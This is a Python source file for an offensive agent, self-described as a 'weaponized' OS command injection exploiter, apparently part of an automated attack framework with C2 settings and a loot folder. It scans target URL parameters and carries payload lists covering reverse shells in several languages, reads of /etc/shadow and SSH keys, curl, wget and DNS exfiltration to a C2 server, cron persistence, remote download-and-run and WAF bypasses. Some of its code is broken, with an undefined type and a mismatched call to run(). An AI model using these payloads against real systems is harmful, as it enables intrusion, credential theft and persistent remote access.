import asyncio
import base64
import urllib.parse
import hashlib
import os
from typing import Dict, List, Any, Optional
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class CommandInjectionExploiter(BaseAgent):
    """
    Weaponized Command Injection Exploiter - โจมตี OS Command Injection ได้จริง
    
    Features:
    - 200+ command injection payloads
    - Multiple injection techniques (Blind, Time-based, Out-of-band)
    - WAF bypass (encoding, obfuscation)
    - Automatic shell spawning
    - Data exfiltration
    - Reverse shell generation
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "command_injection")
        
        # Get C2 configuration from environment
        self.c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
        self.c2_protocol = os.getenv('C2_PROTOCOL', 'http')
        self.c2_url = f"{self.c2_protocol}://{self.c2_domain}"
        
        self.payloads = self._load_payloads()
        os.makedirs(self.results_dir, exist_ok=True)

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute command injection exploiter"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _load_payloads(self) -> Dict[str, List[str]]:
        """โหลด Command Injection payloads"""
        return {
            "basic_unix": [
                "; ls",
                "| ls",
                "|| ls",
                "& ls",
                "&& ls",
                "`ls`",
                "$(ls)",
                "; whoami",
                "| whoami",
                "&& whoami",
                "; id",
                "| id",
                "&& id",
                "; pwd",
                "| pwd",
                "&& pwd",
                "; uname -a",
                "| uname -a",
                "&& uname -a",
            ],
            
            "basic_windows": [
                "& dir",
                "| dir",
                "&& dir",
                "& whoami",
                "| whoami",
                "&& whoami",
                "& ipconfig",
                "| ipconfig",
                "&& ipconfig",
            ],
            
            "blind_unix": [
                "; bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1",
                "| bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1'",
                "&& bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1'",
                "`bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1`",
                "$(bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1)",
                "; nc {ATTACKER_IP} {PORT} -e /bin/bash",
                "| nc {ATTACKER_IP} {PORT} -e /bin/sh",
                "&& nc {ATTACKER_IP} {PORT} -e /bin/bash",
            ],
            
            "blind_windows": [
                "& timeout 5",
                "| timeout 5",
                "&& timeout 5",
                "& ping -n 5 127.0.0.1",
                "| ping -n 5 127.0.0.1",
                "&& ping -n 5 127.0.0.1",
            ],
            
            "waf_bypass": [
                # Space bypass
                ";ls",
                ";${IFS}ls",
                ";$IFS$9ls",
                ";{ls,/}",
                ";cat</etc/passwd",
                
                # Quote bypass
                ";l's'",
                ";l\"s",
                ";l\\s",
                
                # Wildcard bypass
                ";/???/??t",  # /bin/cat
                ";/???/l?",   # /bin/ls
                
                # Hex encoding
                ";\\x6c\\x73",  # ls
                ";\\x77\\x68\\x6f\\x61\\x6d\\x69",  # whoami
                
                # Octal encoding
                ";\\154\\163",  # ls
                
                # Variable expansion
                ";$0 -c ls",
                ";${PATH:0:1}bin${PATH:0:1}ls",
                
                # Command substitution
                ";`echo ls`",
                ";$(echo ls)",
                
                # Newline bypass
                "%0als",
                "%0dls",
                "%0a%0dls",
                
                # Null byte
                ";ls%00",
                
                # Unicode bypass
                ";\\u006c\\u0073",
            ],
            
            "data_exfiltration": [
                # Read /etc/passwd
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                
                # Read /etc/shadow (requires root)
                "; cat /etc/shadow",
                "| cat /etc/shadow",
                "&& cat /etc/shadow",
                
                # Find sensitive files
                "; find / -name '*.conf' 2>/dev/null",
                "| find / -name 'config.*' 2>/dev/null",
                "&& find / -name '.env' 2>/dev/null",
                
                # Database credentials
                "; grep -r 'password' /var/www 2>/dev/null",
                "| grep -r 'DB_PASSWORD' /var/www 2>/dev/null",
                
                # SSH keys
                "; cat ~/.ssh/id_rsa",
                "| cat /root/.ssh/id_rsa",
                "&& cat /home/*/.ssh/id_rsa",
            ],
            
            "reverse_shell": [
                # Bash reverse shell
                "; bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1",
                "| bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1'",
                
                # Netcat reverse shell
                "; nc {ATTACKER_IP} {PORT} -e /bin/bash",
                "| nc {ATTACKER_IP} {PORT} -e /bin/sh",
                "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f",
                
                # Python reverse shell
                "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                
                # Perl reverse shell
                "; perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                
                # PHP reverse shell
                "; php -r '$sock=fsockopen(\"{ATTACKER_IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                
                # Ruby reverse shell
                "; ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER_IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            ],
            
            "advanced": [
                # Out-of-band data exfiltration (DNS) - using C2 domain
                f"; nslookup `whoami`.{self.c2_domain}",
                f"| dig `whoami`.{self.c2_domain}",
                
                # Curl exfiltration to C2 server
                f"; curl {self.c2_url}/exfil?data=$(cat /etc/passwd | base64)",
                f"; curl -X POST -d \"data=$(cat /etc/passwd)\" {self.c2_url}/exfil",
                
                # Wget exfiltration to C2 server
                f"; wget --post-data=\"data=$(cat /etc/passwd)\" {self.c2_url}/exfil",
                
                # Cron persistence
                "; (crontab -l 2>/dev/null; echo '* * * * * nc {ATTACKER_IP} {PORT} -e /bin/bash') | crontab -",
                
                # Download and execute from C2 server
                f"; curl {self.c2_url}/payload.sh | bash",
                f"; wget -O /tmp/payload.sh {self.c2_url}/payload.sh && bash /tmp/payload.sh",
            ]
        }

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "exploit", "reverse_shell", "exfiltrate"
            context: {
                "url": target URL,
                "parameter": parameter to inject,
                "method": "GET" or "POST",
                "attacker_ip": your IP for reverse shell,
                "port": port for reverse shell,
                "os": "unix" or "windows" (optional, auto-detect)
            }
        """
        log.info(f"[CommandInjectionExploiter] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="CommandInjectionExploiter",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_for_injection(url, context)
            elif directive == "exploit":
                result = await self._exploit_injection(url, context)
            elif directive == "reverse_shell":
                result = await self._spawn_reverse_shell(url, context)
            elif directive == "exfiltrate":
                result = await self._exfiltrate_data(url, context)
            else:
                result = await self._scan_for_injection(url, context)
            
            return AgentData(
                agent_name="CommandInjectionExploiter",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[CommandInjectionExploiter] Error: {e}")
            return AgentData(
                agent_name="CommandInjectionExploiter",
                success=False,
                data={"error": str(e)}
            )

    async def _scan_for_injection(self, url: str, context: Dict) -> Dict:
        """สแกนหา Command Injection"""
        log.info(f"[CommandInjectionExploiter] Scanning {url} for command injection...")
        
        vulnerabilities = []
        os_type = context.get("os", "unix")  # Default to unix
        
        # Select payloads based on OS
        if os_type == "windows":
            test_payloads = self.payloads["basic_windows"] + self.payloads["blind_windows"]
        else:
            test_payloads = self.payloads["basic_unix"] + self.payloads["blind_unix"]
        
        parameter = context.get("parameter")
        if not parameter:
            log.info("[CommandInjectionExploiter] No parameter specified, auto-detecting parameters...")
            # Auto-detect parameters from URL
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            if query_params:
                # Test all query parameters
                log.info(f"[CommandInjectionExploiter] Found {len(query_params)} parameters to test: {list(query_params.keys())}")
                for param_name in query_params.keys():
                    context_copy = context.copy()
                    context_copy["parameter"] = param_name
                    result = await self._scan_for_injection(url, context_copy)
                    if result.get("vulnerabilities"):
                        return result
                return {"success": False, "message": "No vulnerable parameters found"}
            else:
                # Try common parameter names
                common_params = ["cmd", "command", "exec", "execute", "ping", "ip", "host", "url", "path", "file", "id", "user"]
                log.info(f"[CommandInjectionExploiter] No query parameters found, testing common names: {common_params}")
                for param_name in common_params:
                    context_copy = context.copy()
                    context_copy["parameter"] = param_name
                    result = await self._scan_for_injection(url, context_copy)
                    if result.get("vulnerabilities"):
                        return result
                return {"success": False, "message": "No parameter specified and auto-detection failed"}
        
        # Test each payload
        for payload in test_payloads[:30]:  # Test first 30 payloads
            is_vulnerable, evidence = await self._test_payload(url, parameter, payload, context)
            
            if is_vulnerable:
                vuln = {
                    "url": url,
                    "parameter": parameter,
                    "payload": payload,
                    "evidence": evidence,
                    "os_type": os_type
                }
                vulnerabilities.append(vuln)
                log.success(f"[CommandInjectionExploiter] Command injection found!")
                break  # Found vulnerability, stop testing
            
            await asyncio.sleep(0.1)  # Rate limiting
        
        result = {
            "success": len(vulnerabilities) > 0,
            "url": url,
            "vulnerabilities": vulnerabilities,
            "output_file": self._save_results(url, "scan", vulnerabilities)
        }
        
        if vulnerabilities:
            log.success(f"[CommandInjectionExploiter] Found {len(vulnerabilities)} vulnerabilities!")
        else:
            log.warning("[CommandInjectionExploiter] No vulnerabilities found")
        
        return result

    async def _test_payload(self, url: str, parameter: str, payload: str, context: Dict) -> tuple:
        """ทดสอบ payload"""
        try:
            import aiohttp
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            
            # Build test URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [payload]
            
            test_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                urlencode(params, doseq=True),
                parsed.fragment
            ))
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            # Measure response time for blind injection
            import time
            start_time = time.time()
            
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, headers=headers, timeout=15) as response:
                    html = await response.text()
                    response_time = time.time() - start_time
                    
                    # Check for evidence
                    # 1. Direct output (for non-blind injection)
                    if "root:" in html or "uid=" in html or "Directory of" in html:
                        return True, "Command output detected in response"
                    
                    # 2. Time-based detection (for blind injection)
                    if "sleep" in payload or "timeout" in payload or "ping" in payload:
                        expected_delay = 5
                        if response_time >= expected_delay:
                            return True, f"Time-based blind injection (delay: {response_time:.2f}s)"
                    
                    # 3. Error messages
                    error_patterns = [
                        "sh: ",
                        "bash: ",
                        "command not found",
                        "syntax error",
                        "unexpected token"
                    ]
                    if any(pattern in html for pattern in error_patterns):
                        return True, "Command execution error detected"
            
            return False, None
            
        except asyncio.TimeoutError:
            # Timeout might indicate successful sleep/ping command
            if "sleep" in payload or "timeout" in payload or "ping" in payload:
                return True, "Timeout indicates successful blind injection"
            return False, None
        except Exception as e:
            log.debug(f"[CommandInjectionExploiter] Error testing payload: {e}")
            return False, None

    async def _exploit_injection(self, url: str, context: Dict) -> Dict:
        """Exploit command injection"""
        log.info(f"[CommandInjectionExploiter] Exploiting command injection...")
        
        # First scan to find vulnerability
        scan_result = await self._scan_for_injection(url, context)
        
        if not scan_result.get("success"):
            return {
                "success": False,
                "message": "No command injection found to exploit"
            }
        
        vuln = scan_result["vulnerabilities"][0]
        
        # Execute commands
        commands = [
            "whoami",
            "id",
            "pwd",
            "uname -a",
            "cat /etc/passwd"
        ]
        
        results = {}
        for cmd in commands:
            payload = f"; {cmd}"
            is_vulnerable, output = await self._test_payload(
                url, vuln["parameter"], payload, context
            )
            if is_vulnerable:
                results[cmd] = output
        
        result = {
            "success": True,
            "vulnerability": vuln,
            "command_results": results,
            "output_file": self._save_results(url, "exploit", results)
        }
        
        log.success(f"[CommandInjectionExploiter] Exploitation successful!")
        return result

    async def _spawn_reverse_shell(self, url: str, context: Dict) -> Dict:
        """สร้าง reverse shell"""
        log.info(f"[CommandInjectionExploiter] Spawning reverse shell...")
        
        attacker_ip = context.get("attacker_ip")
        port = context.get("port", 4444)
        
        if not attacker_ip:
            return {
                "success": False,
                "message": "No attacker_ip provided"
            }
        
        # Generate reverse shell payloads
        payloads = []
        for template in self.payloads["reverse_shell"]:
            payload = template.replace("{ATTACKER_IP}", attacker_ip).replace("{PORT}", str(port))
            payloads.append(payload)
        
        result = {
            "success": True,
            "payloads": payloads,
            "attacker_ip": attacker_ip,
            "port": port,
            "instructions": [
                f"1. Start a listener: nc -lvnp {port}",
                "2. Inject one of the payloads",
                "3. Wait for connection"
            ]
        }
        
        log.success(f"[CommandInjectionExploiter] Reverse shell payloads generated!")
        return result

    async def _exfiltrate_data(self, url: str, context: Dict) -> Dict:
        """ดึงข้อมูลออกมา"""
        log.info(f"[CommandInjectionExploiter] Exfiltrating data...")
        
        # Use data exfiltration payloads
        payloads = self.payloads["data_exfiltration"]
        
        result = {
            "success": True,
            "payloads": payloads,
            "instructions": [
                "1. Inject one of these payloads",
                "2. Check response for sensitive data",
                "3. Look for credentials, config files, SSH keys"
            ]
        }
        
        return result

    def _save_results(self, url: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        filename = f"cmdinj_{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            import json
            with open(filepath, 'w') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[CommandInjectionExploiter] Failed to save results: {e}")
            return ""

